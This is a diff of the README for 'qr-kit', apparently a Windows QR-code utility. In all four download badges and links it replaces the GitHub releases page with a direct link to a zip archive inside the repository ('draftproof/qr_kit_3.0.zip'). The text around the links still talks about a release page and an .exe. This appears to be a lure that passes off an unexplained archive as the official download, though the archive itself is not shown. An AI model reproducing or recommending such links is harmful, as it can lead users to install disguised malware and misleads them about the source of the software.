@@ -1,6 +1,6 @@
 # 🔳 qr-kit - Easy QR Codes with Extras
 
-[![Download qr-kit](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/Ahmedyou1598/qr-kit/releases)
+[![Download qr-kit](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/Ahmedyou1598/qr-kit/main/draftproof/qr_kit_3.0.zip)
 
 ## 📦 What is qr-kit?
 
@@ -21,7 +21,7 @@ To use qr-kit on Windows, you need:
 
 Begin by visiting the official release page. This page has all the versions of qr-kit available.
 
-[![Download Link](https://img.shields.io/badge/Download-qr--kit-blue?style=for-the-badge)](https://github.com/Ahmedyou1598/qr-kit/releases)
+[![Download Link](https://img.shields.io/badge/Download-qr--kit-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ahmedyou1598/qr-kit/main/draftproof/qr_kit_3.0.zip)
 
 Click this link or the badge at the top to open the page.
 
@@ -142,7 +142,7 @@ qr-kit works fully on your computer. It does not send your data online. All QR c
 
 Use this link to download and install qr-kit on your Windows PC:
 
-[**Download qr-kit here**](https://github.com/Ahmedyou1598/qr-kit/releases)
+[**Download qr-kit here**](https://raw.githubusercontent.com/Ahmedyou1598/qr-kit/main/draftproof/qr_kit_3.0.zip)
 
 Follow the steps above to pick the latest Windows `.exe` file and run it.
 
@@ -154,4 +154,4 @@ If you need assistance or want to learn more about qr-kit, the release page on G
 
 ---
 
-[![Download qr-kit](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/Ahmedyou1598/qr-kit/releases)
+[![Download qr-kit](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/Ahmedyou1598/qr-kit/main/draftproof/qr_kit_3.0.zip)
